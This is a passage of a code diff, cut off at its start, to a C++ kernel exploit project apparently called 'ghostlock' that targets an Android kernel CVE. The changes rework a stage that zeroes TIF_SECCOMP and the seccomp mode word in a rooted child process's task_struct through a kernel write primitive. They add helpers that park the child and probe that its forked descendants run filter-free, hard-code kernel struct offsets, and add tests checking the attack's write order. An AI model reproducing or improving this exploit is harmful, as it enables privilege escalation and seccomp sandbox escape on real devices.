              if (!attack::process_has_seccomp()) {
-                 pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
+-                pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
++                pr_success("no app seccomp filter (shell flow); skipping W3\n");
                  seccomp_ok = 1;
-@@ -292,11 +295,11 @@ namespace ghostlock::session::backend {
+                 return true;
+             }
+@@ -283,58 +306,80 @@ namespace ghostlock::session::backend {
+                 support::run_state::complete("w3a");
+             }
  
-             uint32_t w3_attempts = g_exploit_session.profile.w3_attempts();
-             for (uint32_t attempt = 1; attempt <= w3_attempts; attempt++) {
+-            uintptr_t flags_target = w3_context.leaf_to_target8
+-                                         ? child_task - 8
+-                                         : child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF;
+-            uintptr_t mode_target = w3_context.leaf_to_target8
+-                                        ? child_task + ghostlock::profile::task_seccomp_off() - 8
+-                                        : child_task + ghostlock::profile::task_seccomp_off();
+-
+-            uint32_t w3_attempts = g_exploit_session.profile.w3_attempts();
+-            for (uint32_t attempt = 1; attempt <= w3_attempts; attempt++) {
 -                pr_info("W3: TIF_SECCOMP+mode attempt %u/%u\n", attempt, w3_attempts);
-+                pr_info("W3: TIF_SECCOMP mask + mode attempt %u/%u\n", attempt, w3_attempts);
-                 if (attempt == 1) attack::slab_drain();
-                 support::run_state::enter("w3b");
-                 const memory::WriteRequest flags_request =
+-                if (attempt == 1) attack::slab_drain();
+-                support::run_state::enter("w3b");
+-                const memory::WriteRequest flags_request =
 -                        memory::WriteRequest::make(flags_target, memory::WriteMode::Zero, 1);
-+                        memory::WriteRequest::make(flags_target, memory::WriteMode::SeccompFlags, 0);
-                 Status routed = Cve2026_43499Policy::template attack_write<M>(session, flags_request, "W3: TIF_SECCOMP");
-                 if (!routed) {
-                     pr_warning("W3 attempt %u route failed; backing off\n", attempt);
-@@ -307,7 +310,7 @@ namespace ghostlock::session::backend {
-                 usleep(g_exploit_session.profile.w3_settle_us());
-                 support::run_state::enter("w3c");
-                 const memory::WriteRequest mode_request =
+-                Status routed = Cve2026_43499Policy::template attack_write<M>(session, flags_request, "W3: TIF_SECCOMP");
+-                if (!routed) {
+-                    pr_warning("W3 attempt %u route failed; backing off\n", attempt);
++            const uintptr_t flags_target = w3_context.leaf_to_target8
++                                               ? child_task - 8
++                                               : child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF;
++            const uintptr_t mode_target = w3_context.leaf_to_target8
++                                              ? child_task + ghostlock::profile::task_seccomp_off() - 8
++                                              : child_task + ghostlock::profile::task_seccomp_off();
++
++            /* One zero store. Until the child runs again there is no
++             * userspace-visible state to verify against, so an attempt either
++             * reports a landed relink or is simply re-run. */
++            const uint32_t write_attempts = g_exploit_session.profile.w3_attempts();
++            const auto zero_word = [&](uintptr_t target, const char *stage) {
++                const memory::WriteRequest request =
++                        memory::WriteRequest::make(target, memory::WriteMode::Zero, 1);
++                for (uint32_t attempt = 1; attempt <= write_attempts; attempt++) {
++                    pr_info("%s attempt %u/%u\n", stage, attempt, write_attempts);
++                    if (attempt == 1) attack::slab_drain();
++                    if (Cve2026_43499Policy::template attack_write<M>(session, request, stage))
++                        return true;
+                     usleep(100000);
+-                    continue;
+                 }
++                return false;
++            };
++
++            /* Park the child for the whole window: mode=DISABLED with the flag
++             * still set is a BUG, and a fork would re-arm the flag. */
++            support::run_state::enter("w3b");
++            if (!victim::stop_child(pipes)) {
++                support::run_state::fail("w3b");
++                if (pipes.child() <= 0) child_alive = 0;
++                pr_warning("W3 could not park the rooted child\n");
++                return false;
++            }
++            /* Stop at the first failed store: a partial state is only safe while
++             * mode stays FILTER, so never zero mode after a missed flag write. */
++            bool cleared = zero_word(flags_target, "W3: TIF_SECCOMP clear");
++            if (cleared) cleared = zero_word(mode_target, "W3: seccomp mode clear");
++            /* Insurance: the flag word is the store that keeps every partial
++             * state safe, so give it a second, independent landing while the
++             * child is still parked. */
++            if (cleared) cleared = zero_word(flags_target, "W3: TIF_SECCOMP re-clear");
++            /* `completed` means the stores were issued and every route reported a
++             * landed relink; it is not the bypass verdict. A route that refuses
++             * the request must never look like success (the pre-fix W3 recorded
++             * `completed` for writes the primitive rejected). */
++            if (cleared) {
+                 support::run_state::complete("w3b");
+-                usleep(g_exploit_session.profile.w3_settle_us());
+-                support::run_state::enter("w3c");
+-                const memory::WriteRequest mode_request =
 -                        memory::WriteRequest::make(mode_target, memory::WriteMode::Zero, 1);
-+                        memory::WriteRequest::make(mode_target, memory::WriteMode::SeccompMode, 0);
-                 routed = Cve2026_43499Policy::template attack_write<M>(session, mode_request, "W3: seccomp mode");
-                 if (!routed) {
-                     pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
+-                routed = Cve2026_43499Policy::template attack_write<M>(session, mode_request, "W3: seccomp mode");
+-                if (!routed) {
+-                    pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
+-                    usleep(100000);
+-                    continue;
+-                }
+-                support::run_state::complete("w3c");
+-                usleep(g_exploit_session.profile.w3_settle_us());
+-                int32_t st = 0;
+-                if (waitpid(pipes.child(), &st, WNOHANG) == pipes.child()) {
+-                    pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
+-                    pipes.mark_child_exited();
+-                    child_alive = 0;
+-                    break;
+-                }
+-                if (victim::verify_seccomp_probe_stage(&w2_context)) {
+-                    seccomp_ok = 1;
+-                    break;
+-                }
+-                usleep(g_exploit_session.profile.w3_settle_us());
++            } else {
++                support::run_state::fail("w3b");
+             }
+-
+-            if (!seccomp_ok) {
+-                pr_warning("W3 seccomp clear failed; ksud late-load will likely stay blocked\n");
++            usleep(g_exploit_session.profile.w3_settle_us());
++
++            support::run_state::enter("w3c");
++            const int32_t mode = victim::continue_and_report_seccomp(pipes);
++            pr_info("W3: child reports Seccomp: %d\n", mode);
++            if (mode != 0) {
++                support::run_state::fail("w3c");
++                pr_warning("W3 seccomp clear failed (mode=%d writes=%d); ksud "
++                           "late-load will stay blocked\n", mode, cleared ? 1 : 0);
++                return false;
++            }
++            /* The fork probe is the verdict: it passes only when copy_seccomp()
++             * stops re-arming TIF_SECCOMP, which is the property ksud needs one
++             * process further down the chain. */
++            if (!victim::verify_fork_seccomp_stage(&w2_context)) {
++                support::run_state::fail("w3c");
++                pr_warning("W3: mode is disabled but a forked child is re-armed\n");
+                 return false;
+             }
+-            pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
++            /* Informational: the errno cannot separate filtered from unfiltered. */
++            victim::probe_finit_module_stage(&w2_context);
++            support::run_state::complete("w3c");
++            seccomp_ok = 1;
++            pr_success("child seccomp disabled (mode=0); descendants run filter-free\n");
+             return true;
+         }
+ 
+diff --git a/src/core/session/victim_process.cpp b/src/core/session/victim_process.cpp
+index 003c9d6..30955d2 100644
+--- a/src/core/session/victim_process.cpp
++++ b/src/core/session/victim_process.cpp
+@@ -10,8 +10,41 @@
+ #include "support/native_resource.hpp"
+ 
+ #include <array>
++#include <cerrno>
++#include <cstdlib>
++#include <string>
++#include <poll.h>
++#include <signal.h>
++#include <string_view>
++#include <sys/wait.h>
+ 
+ namespace ghostlock::session::victim {
++    /* seccomp.mode as the kernel reports it for ourselves: 0 disabled,
++     * 2 filter; -1 when the field is unreadable. The status file is read in
++     * full: "Seccomp:" sits near the end and a short buffer would truncate it. */
++    static int32_t read_self_seccomp_mode(void) {
++        support::UniqueFd status(open("/proc/self/status", O_RDONLY | O_CLOEXEC));
++        if (!status.valid()) return -1;
++        std::string text;
++        constexpr size_t kMaxStatusBytes = 65536;
++        std::array<char, 2048> chunk{};
++        for (;;) {
++            const ssize_t n = read(status.get(), chunk.data(), chunk.size());
++            if (n > 0) {
++                text.append(chunk.data(), static_cast<size_t>(n));
++                if (text.size() > kMaxStatusBytes) break;
++                continue;
++            }
++            if (n < 0 && errno == EINTR) continue;
++            break;
++        }
++        if (text.empty()) return -1;
++        const std::string_view view(text);
++        const size_t at = view.find("\nSeccomp:");
++        if (at == std::string_view::npos) return -1;
++        const char *value = view.data() + at + sizeof("\nSeccomp:");
++        return static_cast<int32_t>(strtol(value, nullptr, 10));
++    }
+     /* rooted exits kfree the static init_cred (w2 stores it with no
+  * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
+     static void park_child_process_forever(void) {
+@@ -83,6 +116,23 @@ namespace ghostlock::session::victim {
+                     close(probe_pipe[0]);
+                 }
+                 write(p.uid_write.get(), &code, sizeof(code));
++            } else if (cmd == 'K') {
++                /* Forked-inheritance probe: a child of a DISABLED task must
++             * report mode 0 as well, because a fork re-arms TIF_SECCOMP only
++             * while the mode is not DISABLED. The verdict travels as the exit
++             * status, so no pipe can leak a stale read. */
++                uint32_t mode = 0xffffffffU;
++                const pid_t probe = fork();
++                if (probe == 0) {
++                    _exit(static_cast<int32_t>(read_self_seccomp_mode()) & 0xff);
++                }
++                if (probe > 0) {
++                    int32_t st = 0;
++                    if (waitpid(probe, &st, 0) == probe && WIFEXITED(st)) {
++                        mode = static_cast<uint32_t>(WEXITSTATUS(st));
++                    }
++                }
++                write(p.uid_write.get(), &mode, sizeof(mode));
+             } else if (cmd == 'M') {
+                 /* Report comm length + first byte to tell which side a leaf=1 write
+              * landed: comm "ghostleaf_012345" zeroed at [target] reads len 0, at
+@@ -101,6 +151,14 @@ namespace ghostlock::session::victim {
+                 uint32_t report =
+                         (static_cast<uint32_t>(len) << 8) | static_cast<uint32_t>(static_cast<unsigned char>(comm[0]));
+                 write(p.uid_write.get(), &report, sizeof(report));
++            } else if (cmd == 'S') {
++                /* W3 sanitize window. Park this task in a group stop so no
++             * syscall of ours can observe an intermediate seccomp state while
++             * the kernel writes land; the parent resumes us with SIGCONT and
++             * then reads the mode we report. */
++                raise(SIGSTOP);
++                uint32_t mode = static_cast<uint32_t>(read_self_seccomp_mode());
++                write(p.uid_write.get(), &mode, sizeof(mode));
+             } else if (cmd == 'P') {
+                 /* w2 rooted this task; park */
+                 p.cmd_read.reset();
+@@ -223,27 +281,105 @@ namespace ghostlock::session::victim {
+         return 1;
+     }
+ 
+-    int32_t verify_seccomp_probe_stage(void *context) {
++    int32_t stop_child(VictimContext &p) {
++        const pid_t child = p.child();
++        if (child <= 0) return 0;
++        if (write(p.cmd_write.get(), "S", 1) != 1) {
++            pr_warning("W3: cannot send the sanitize stop to child %d errno=%d\n",
++                       child, errno);
++            return 0;
++        }
++        int32_t status = 0;
++        pid_t waited;
++        do {
++            waited = waitpid(child, &status, WUNTRACED);
++        } while (waited < 0 && errno == EINTR);
++        if (waited != child) {
++            pr_warning("W3: child %d did not reach the sanitize stop errno=%d\n",
++                       child, errno);
++            p.mark_child_exited();
++            return 0;
++        }
++        if (!WIFSTOPPED(status)) {
++            pr_warning("W3: child %d left before the sanitize stop status=0x%x\n",
++                       child, status);
++            p.mark_child_exited();
++            return 0;
++        }
++        pr_info("W3: child %d stopped for the seccomp clear\n", child);
++        return 1;
++    }
++
++    int32_t continue_and_report_seccomp(VictimContext &p) {
++        const pid_t child = p.child();
++        if (child <= 0) return -1;
++        if (kill(child, SIGCONT) != 0) {
++            pr_warning("W3: SIGCONT child %d failed errno=%d\n", child, errno);
++            return -1;
++        }
++        struct pollfd ready_fd = {
++            .fd = p.uid_read.get(), .events = POLLIN, .revents = 0,
++        };
++        const int32_t ready = poll(&ready_fd, 1, 5000);
++        if (ready <= 0) {
++            pr_warning("W3: no seccomp report from child %d poll=%d errno=%d\n",
++                       child, ready, errno);
++            return -1;
++        }
++        uint32_t mode = 0xffffffffU;
++        if (read(p.uid_read.get(), &mode, sizeof(mode)) !=
++            static_cast<ssize_t>(sizeof(mode))) {
++            return -1;
++        }
++        return static_cast<int32_t>(mode);
++    }
++
++    int32_t verify_fork_seccomp_stage(void *context) {
+         auto *stage = static_cast<struct w2_stage_context *>(context);
+-        if (write(stage->pipes.cmd_write.get(), "F", 1) != 1) return 0;
++        if (write(stage->pipes.cmd_write.get(), "K", 1) != 1) return 0;
+ 
+-        uint32_t code = 0;
+-        if (read(stage->pipes.uid_read.get(), &code, sizeof(code)) !=
+-            static_cast<ssize_t>(sizeof(code))) {
++        uint32_t mode = 0xffffffffU;
++        if (read(stage->pipes.uid_read.get(), &mode, sizeof(mode)) !=
++            static_cast<ssize_t>(sizeof(mode))) {
+             return 0;
+         }
+-        pr_info("seccomp finit_module probe = 0x%x\n", code);
+-        /* SIGSYS (0xfffffffd) = filter kills; EPERM/ENOSYS = its RET_ERRNO actions.
+-     * With init_cred + permissive SELinux a real probe fails with a normal
+-     * errno instead. */
+-        if (code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
+-            code == 1 || code == 38) {
++        pr_info("forked child reports Seccomp: %d\n", static_cast<int32_t>(mode));
++        /* The decisive check: kernel/fork.c copy_seccomp() re-arms TIF_SECCOMP
++         * in every child while seccomp.mode != DISABLED, so a child that reports
++         * mode 0 proves the clear reached the descendants - which is exactly
++         * what `sh -> ksud` needs. Unlike the finit_module errno (see
++         * probe_finit_module_stage) this result is unambiguous. */
++        if (mode != 0) {
++            pr_warning("forked child still filtered (mode=%d); descendants would "
++                       "re-arm TIF_SECCOMP\n", static_cast<int32_t>(mode));
+             return 0;
+         }
+-        pr_success("child seccomp filter bypassed (finit_module errno=%u)\n", code);
++        pr_success("forked child inherits mode=0 (copy_seccomp stops re-arming)\n");
+         return 1;
+     }
+ 
++    void probe_finit_module_stage(void *context) {
++        auto *stage = static_cast<struct w2_stage_context *>(context);
++        if (write(stage->pipes.cmd_write.get(), "F", 1) != 1) return;
++
++        uint32_t code = 0;
++        if (read(stage->pipes.uid_read.get(), &code, sizeof(code)) !=
++            static_cast<ssize_t>(sizeof(code))) {
++            return;
++        }
++        pr_info("finit_module probe errno field = 0x%x (informational)\n", code);
++        /* Corrected interpretation (the previous comment was wrong):
++         *
++         * A SECCOMP_RET_KILL action terminates the thread and cannot return an
++         * errno, so 0xfffffffd is NOT a SIGSYS marker - it is -ESRCH. The
++         * filter's RET_ERRNO actions surface as ordinary negative errnos
++         * (commonly -ENOSYS = 38, sometimes -EPERM), and an UNFILTERED
++         * finit_module also returns -ESRCH for a bogus fd. The value therefore
++         * cannot separate "the filter blocked it" from "the syscall ran and
++         * rejected its arguments", so this line is logged for the record only;
++         * verify_fork_seccomp_stage() is the verdict. */
++    }
++
+     int32_t verify_leaf_dir_stage(void *context) {
+         auto *stage = static_cast<struct w3_stage_context *>(context);
+         if (write(stage->pipes.cmd_write.get(), "M", 1) != 1) return 0;
+diff --git a/src/core/session/victim_process.hpp b/src/core/session/victim_process.hpp
+index 322a91f..5b8ebe4 100644
+--- a/src/core/session/victim_process.hpp
++++ b/src/core/session/victim_process.hpp
+@@ -26,12 +26,31 @@ namespace ghostlock::session::victim {
+ 
+     std::optional<VictimSpawn> spawn_victim(VictimContext &p);
+ 
++    /* W3 sanitize window. stop_child() parks the rooted child in a group stop
++ * (the 'S' protocol step) so no syscall of its own can run while the kernel
++ * writes land; continue_and_report_seccomp() resumes it with SIGCONT and
++ * returns the seccomp mode the task then reports, or -1 when it did not
++ * answer. A caller that fails after stop_child() must still resume the child
++ * (continue_and_report_seccomp or SIGCONT) before parking or retiring it. */
++    int32_t stop_child(VictimContext &p);
++
++    int32_t continue_and_report_seccomp(VictimContext &p);
++
+     /* Stage verification callbacks. */
+     int32_t verify_selinux_stage(void *context);
+ 
+     int32_t verify_w2_stage(void *context);
+ 
+-    int32_t verify_seccomp_probe_stage(void *context);
++    /* The verdict: a forked child must also report `Seccomp: 0`, which proves
++ * kernel/fork.c copy_seccomp() stopped re-arming TIF_SECCOMP (the property the
++ * `sh -> ksud` chain needs). Unambiguous, unlike the finit_module errno. */
++    int32_t verify_fork_seccomp_stage(void *context);
++
++    /* Informational only: logs the finit_module errno field. -ESRCH cannot
++ * distinguish a filtered syscall from an unfiltered one with a bogus fd, so
++ * this never returns a pass/fail verdict (see the corrected comment in the
++ * implementation). */
++    void probe_finit_module_stage(void *context);
+ 
+     int32_t verify_leaf_dir_stage(void *context);
+ } // namespace ghostlock::session::victim
+diff --git a/src/core/support/run_state.cpp b/src/core/support/run_state.cpp
+index 95315a0..f29aeef 100644
+--- a/src/core/support/run_state.cpp
++++ b/src/core/support/run_state.cpp
+@@ -77,4 +77,6 @@ namespace ghostlock::support::run_state {
+     void enter(const char *step) noexcept { transition(step, "in_progress"); }
+ 
+     void complete(const char *step) noexcept { transition(step, "completed"); }
++
++    void fail(const char *step) noexcept { transition(step, "failed"); }
+ } // namespace ghostlock::support::run_state
+diff --git a/src/core/support/run_state.hpp b/src/core/support/run_state.hpp
+index a793a25..b0daec4 100644
+--- a/src/core/support/run_state.hpp
++++ b/src/core/support/run_state.hpp
+@@ -30,6 +30,13 @@ namespace ghostlock::support::run_state {
+ 
+     /* Announce that `step` finished and wait for the app to persist it. */
+     void complete(const char *step) noexcept;
++
++    /* Announce that `step` failed and wait for the app to persist it.
++     * `complete` must mean "verified by a probe", never merely "the route
++     * returned success": a route can accept a write the primitive cannot
++     * express, and recording that as completed is how W3's no-op writes were
++     * previously mistaken for a working bypass. */
++    void fail(const char *step) noexcept;
+ } // namespace ghostlock::support::run_state
+ 
+ #endif
+diff --git a/src/core/tests/host/backend_dataflow_test.cpp b/src/core/tests/host/backend_dataflow_test.cpp
+index ca57c13..3c11211 100644
+--- a/src/core/tests/host/backend_dataflow_test.cpp
++++ b/src/core/tests/host/backend_dataflow_test.cpp
+@@ -7,6 +7,9 @@
+ 
+ #include "host_attack_script.hpp"
+ 
++#include "kernel/target.h"
++#include "kernel/runtime_struct_offsets.h"
++#include "memory/payload_builder.h"
+ #include "route/pipeline.hpp"
+ #include "session/backend/cve_2026_43499_backend.hpp"
+ #include "session/exploit_session.hpp"
+@@ -14,6 +17,7 @@
+ 
+ #include <cstdio>
+ #include <cstdint>
++#include <string>
+ 
+ namespace {
+     using ghostlock::host::script;
+@@ -37,14 +41,20 @@ namespace {
+         return condition;
+     }
+ 
+-    ghostlock::runtime::RunResult run_once() {
++    /* `app_flow` selects the environment the backend runs in:
++     *   true  -> zygote app process WITH a seccomp filter (W3 runs)
++     *   false -> adb/shell flow reporting Seccomp: 0 (W3 skips itself)
++     * Both must reach the handoff; only the app flow writes seccomp state. */
++    ghostlock::runtime::RunResult run_once(bool app_flow = false,
++                                           uint32_t w3_attempts = 0) {
++        script().process_has_seccomp_value = app_flow ? 1 : 0;
+         ghostlock::profile::kernel_offsets decoded{};
+         decoded.meta.kernel_major = 6;
+         decoded.execution.w1_attempts = 3;
+         decoded.execution.w1_scratch_repair_attempts = 1;
+         decoded.execution.w2_attempts = 4;
+         decoded.execution.w3_chain_rounds = 2;
+-        decoded.execution.w3_attempts = 3;
++        decoded.execution.w3_attempts = w3_attempts;
+         ghostlock::session::g_exploit_session.profile =
+                 ghostlock::profile::TargetProfile::from(&decoded);
+         return ghostlock::runtime::Pipeline<
+@@ -64,11 +74,52 @@ namespace {
+                      "happy: terminal stage is the frontend");
+         ok &= expect(count_calls("spawn") == 1, "happy: exactly one victim spawn");
+         ok &= expect(count_calls("verify_w2") >= 1, "happy: W2 verified");
+-        ok &= expect(count_calls("verify_seccomp") >= 1, "happy: W3 seccomp verified");
++        /* Shell flow: no app seccomp filter, so W3 is skipped entirely. */
++        ok &= expect(count_calls("verify_seccomp") == 0,
++                     "happy: W3 seccomp probe not reached in the shell flow");
+         ok &= expect(count_calls("route") >= 1, "happy: at least one route write");
+         return ok;
+     }
+ 
++    /* App flow (the shipped X6840 default): W3 clears seccomp, so the seccomp
++     * probe must be reached and the run must still complete. */
++    bool test_happy_path_app_flow() {
++        reset_script();
++        const auto result = run_once(/*app_flow=*/true, /*w3_attempts=*/3);
++        bool ok = true;
++        ok &= expect(result.code == ghostlock::runtime::RunCode::Completed,
++                     "app: pipeline completes");
++        ok &= expect(result.stage == ghostlock::runtime::RunStage::Frontend,
++                     "app: terminal stage is the frontend");
++        ok &= expect(count_calls("stop_child") == 1, "app: child parked once");
++        ok &= expect(count_calls("verify_seccomp") >= 1,
++                     "app: W3 seccomp probe ran");
++        return ok;
++    }
++
++    /* A shell flow has no app filter (Seccomp: 0), so W3 must touch nothing. */
++    bool test_w3_skipped_in_shell_flow() {
++        reset_script();
++        const auto result = run_once(/*app_flow=*/false, /*w3_attempts=*/3);
++        bool ok = true;
++        ok &= expect(result.code == ghostlock::runtime::RunCode::Completed,
++                     "shell: pipeline completes");
++        ok &= expect(count_calls("stop_child") == 0, "shell: child never parked");
++        ok &= expect(count_calls("continue_child") == 0, "shell: child never resumed");
++        ok &= expect(count_calls("verify_seccomp") == 0,
++                     "shell: no seccomp probe");
++        for (const auto &write : script().writes) {
++            const bool seccomp_target =
++                write.target == script().spawn_default.task ||
++                write.target == script().spawn_default.task +
++                                     ghostlock::profile::task_seccomp_off();
++            if (seccomp_target) {
++                ok &= expect(false, "shell: no seccomp-adjacent write issued");
++            }
++        }
++        return ok;
++    }
++
+     bool test_w2_retry_until_success() {
+         reset_script();
+         script().verify_w2 = {0, 0, 1};
+@@ -110,14 +161,101 @@ namespace {
+                      "selinux: verify_selinux retried twice");
+         return ok;
+     }
++
++    /* W3 may only use the primitive's zero-valued leaf arm, and only while the
++     * child is parked: zeroing seccomp.mode with TIF_SECCOMP still set is a BUG
++     * in __secure_computing(), and a running child could fork in between (fork
++     * re-arms the flag while mode is still FILTER). */
++    bool test_w3_zero_store_plan() {
++        reset_script();
++        const auto result = run_once(/*app_flow=*/true, /*w3_attempts=*/3);
++        bool ok = true;
++
++        const uintptr_t task = script().spawn_default.task;
++        const uintptr_t flags_target = task + 0x00; /* thread_info.flags */
++        const uintptr_t mode_target =
++                task + ghostlock::profile::task_seccomp_off();
++        const std::string flags_tag =
++                ghostlock::host::HostAttackScript::write_tag(flags_target, 1, 1);
++        const std::string mode_tag =
++                ghostlock::host::HostAttackScript::write_tag(mode_target, 1, 1);
++
++        const auto position = [](const std::string &needle) {
++            const auto &timeline = script().timeline;
++            for (size_t i = 0; i < timeline.size(); ++i) {
++                if (timeline[i] == needle) return static_cast<int32_t>(i);
++            }
++            return -1;
++        };
++
++        const int32_t stopped = position("stop_child");
++        const int32_t resumed = position("continue_child");
++        const int32_t flags_at = position(flags_tag);
++        const int32_t mode_at = position(mode_tag);
++
++        ok &= expect(result.code == ghostlock::runtime::RunCode::Completed,
++                     "w3-plan: pipeline completes");
++        ok &= expect(stopped >= 0 && resumed > stopped,
++                     "w3-plan: child parked and resumed once");
++        ok &= expect(flags_at > stopped && flags_at < resumed,
++                     "w3-plan: thread_info.flags zeroed inside the parked window");
++        ok &= expect(mode_at > stopped && mode_at < resumed,
++                     "w3-plan: seccomp mode word zeroed inside the parked window");
++        ok &= expect(flags_at < mode_at,
++                     "w3-plan: flags cleared before mode (no __secure_computing BUG)");
++
++        /* Every W3 store must be the zero leaf arm; W2 is the only pointer arm
++         * and it targets cred. A non-zero, non-pointer value would never land. */
++        bool w3_modes_sane = true;
++        for (const auto &write : script().writes) {
++            const bool in_w3 = write.target == flags_target || write.target == mode_target;
++            if (!in_w3) continue;
++            if (write.mode != static_cast<int32_t>(ghostlock::memory::WriteMode::Zero)) {
++                w3_modes_sane = false;
++            }
++            if (write.leaf != 1) w3_modes_sane = false;
++        }
++        ok &= expect(w3_modes_sane, "w3-plan: W3 stores are Zero/leaf only");
++        ok &= expect(count_calls("verify_seccomp") >= 1,
++                     "w3-plan: forked finit_module probe ran after the clear");
++        return ok;
++    }
++
++    bool test_w3_parked_child_failure_keeps_mode() {
++        reset_script();
++        /* The child will not park: W3 must bail out without zeroing seccomp.mode,
++         * because a mode write behind a live TIF_SECCOMP is the panic path. */
++        script().stop_child_result = 0;
++        const auto result = run_once(/*app_flow=*/true, /*w3_attempts=*/3);
++        bool ok = true;
++        const uintptr_t task = script().spawn_default.task;
++        const uintptr_t mode_target =
++                task + ghostlock::profile::task_seccomp_off();
++        const std::string mode_tag =
++                ghostlock::host::HostAttackScript::write_tag(mode_target, 1, 1);
++        bool mode_written = false;
++        for (const auto &entry : script().timeline) {
++            if (entry == mode_tag) mode_written = true;
++        }
++        ok &= expect(result.code == ghostlock::runtime::RunCode::Completed,
++                     "w3-nopark: run still hands off (temporary root)");
++        ok &= expect(!mode_written, "w3-nopark: seccomp mode never zeroed");
++        ok &= expect(count_calls("continue_child") == 0,
++                     "w3-nopark: no resume of a child that never parked");
++        return ok;
++    }
+ } // namespace
+ 
+ int main() {
+     bool ok = true;
+     ok &= test_happy_path();
++    ok &= test_happy_path_app_flow();
++    ok &= test_w3_skipped_in_shell_flow();
+     ok &= test_w2_retry_until_success();
+     ok &= test_w2_exhausts_attempts();
+     ok &= test_selinux_retry_then_w2();
++    ok &= test_w3_zero_store_plan();
++    ok &= test_w3_parked_child_failure_keeps_mode();
+     if (ok) {
+         std::puts("backend_dataflow_test: ok");
+         return 0;
+diff --git a/src/core/tests/host/host_attack_script.hpp b/src/core/tests/host/host_attack_script.hpp
+index a0e52c7..fc898ed 100644
+--- a/src/core/tests/host/host_attack_script.hpp
++++ b/src/core/tests/host/host_attack_script.hpp
+@@ -11,6 +11,7 @@
+  */
+ 
+ #include <cstdint>
++#include <cstdio>
+ #include <deque>
+ #include <string>
+ #include <vector>
+@@ -52,13 +53,47 @@ namespace ghostlock::host {
+         /* Fake kernel page base handed to the heap spray. */
+         uintptr_t page_base = 0xffff888000000000ULL;
+ 
++        /* W3 sanitize window: the parked child verdict and the seccomp mode it
++         * reports once resumed. */
++        int32_t stop_child_result = 1;
++        int32_t reported_seccomp_mode = 0;
++
++        /* Every middleware request the backend issued, in order, so a test can
++         * assert the write plan (target / mode / leaf). */
++        struct WritePlan {
++            uintptr_t target = 0;
++            int32_t mode = 0;
++            int32_t leaf = 0;
++        };
++        std::vector<WritePlan> writes{};
++
++        /* One merged, ordered log of protocol steps and route writes, so a test
++         * can assert the "park, write, resume" ordering invariant. A write is
++         * logged as `write:<target>:<mode>:<leaf>`, target in %zx form. */
++        std::vector<std::string> timeline{};
++
++        static std::string write_tag(uintptr_t target, int32_t mode, int32_t leaf) {
++            char tag[64] = {};
++            std::snprintf(tag, sizeof(tag), "write:%zx:%d:%d",
++                          static_cast<size_t>(target), mode, leaf);
++            return std::string(tag);
++        }
++
++        void record_write(uintptr_t target, int32_t mode, int32_t leaf) {
++            writes.push_back(WritePlan{target, mode, leaf});
++            timeline.push_back(write_tag(target, mode, leaf));
++        }
++
+         /* Handoff probe result. */
+         bool handoff_ready = true;
+ 
+         /* Recorded call order for assertions. */
+         std::vector<std::string> calls{};
+ 
+-        void record(const char *name) { calls.emplace_back(name); }
++        void record(const char *name) {
++            calls.emplace_back(name);
++            timeline.emplace_back(name);
++        }
+ 
+         int32_t next_selinux() { return pop(verify_selinux, verify_selinux_default); }
+         int32_t next_w2() { return pop(verify_w2, verify_w2_default); }
+diff --git a/src/core/tests/host/route_stub.cpp b/src/core/tests/host/route_stub.cpp
+index 848de18..2c2513e 100644
+--- a/src/core/tests/host/route_stub.cpp
++++ b/src/core/tests/host/route_stub.cpp
+@@ -10,8 +10,11 @@ namespace ghostlock::route::middleware {
+     Status run_middleware_route(session::ExploitSession &session,
+                                 const memory::WriteRequest &request) {
+         (void) session;
+-        (void) request;
+         host::script().record("route");
++        host::script().record_write(
++            static_cast<uintptr_t>(request.target),
++            static_cast<int32_t>(request.mode),
++            request.preserve_child ? 0 : 1);
+         return host::script().next_route();
+     }
+ } // namespace ghostlock::route::middleware
+diff --git a/src/core/tests/host/victim_stub.cpp b/src/core/tests/host/victim_stub.cpp
+index db34383..f1de266 100644
+--- a/src/core/tests/host/victim_stub.cpp
++++ b/src/core/tests/host/victim_stub.cpp
+@@ -15,6 +15,18 @@ namespace ghostlock::session::victim {
+         return VictimSpawn{spawn.pid, spawn.task};
+     }
+ 
++    int32_t stop_child(VictimContext &pipes) {
++        host::script().record("stop_child");
++        (void) pipes;
++        return host::script().stop_child_result;
++    }
++
++    int32_t continue_and_report_seccomp(VictimContext &pipes) {
++        host::script().record("continue_child");
++        (void) pipes;
++        return host::script().reported_seccomp_mode;
++    }
++
+     int32_t verify_selinux_stage(void *context) {
+         (void) context;
+         host::script().record("verify_selinux");
+@@ -27,12 +39,17 @@ namespace ghostlock::session::victim {
+         return host::script().next_w2();
+     }
+ 
+-    int32_t verify_seccomp_probe_stage(void *context) {
++    int32_t verify_fork_seccomp_stage(void *context) {
+         (void) context;
+         host::script().record("verify_seccomp");
+         return host::script().next_seccomp();
+     }
+ 
++    void probe_finit_module_stage(void *context) {
++        (void) context;
++        host::script().record("probe_finit_module");
++    }
++
+     int32_t verify_leaf_dir_stage(void *context) {
+         host::script().record("verify_leaf");
+         const int32_t result = host::script().next_leaf();
+diff --git a/src/core/tests/target_constants_test.cpp b/src/core/tests/target_constants_test.cpp
+index 21c9b56..62bda15 100644
+--- a/src/core/tests/target_constants_test.cpp
++++ b/src/core/tests/target_constants_test.cpp
+@@ -27,6 +27,18 @@ static_assert(ghostlock::kernel::CRED_COPY_OFF == 0x1080);
+ static_assert(ghostlock::kernel::TCP_FAKE_TASK_OFF == 0x5800);
+ static_assert(ghostlock::kernel::TCP_CRED_COPY_OFF == 0x6800);
+ 
++/* W3 zero-store layout: the gate bit lives in the flags word at task+0, and
++ * {mode, filter_count} share one 8-byte slot at task + task_struct.seccomp.
++ * Both stores are whole 64-bit words of zero, which is the only value the
++ * primitive can land. */
++static_assert(ghostlock::kernel::TASK_THREAD_INFO_FLAGS_OFF == 0);
++static_assert(ghostlock::kernel::TIF_SECCOMP_BIT == 11);
++static_assert(ghostlock::kernel::TASK_SECCOMP_OFF == 0x8e8);
++static_assert(ghostlock::kernel::SECCOMP_MODE_OFF == 0);
++static_assert(ghostlock::kernel::SECCOMP_FILTER_COUNT_OFF == 4);
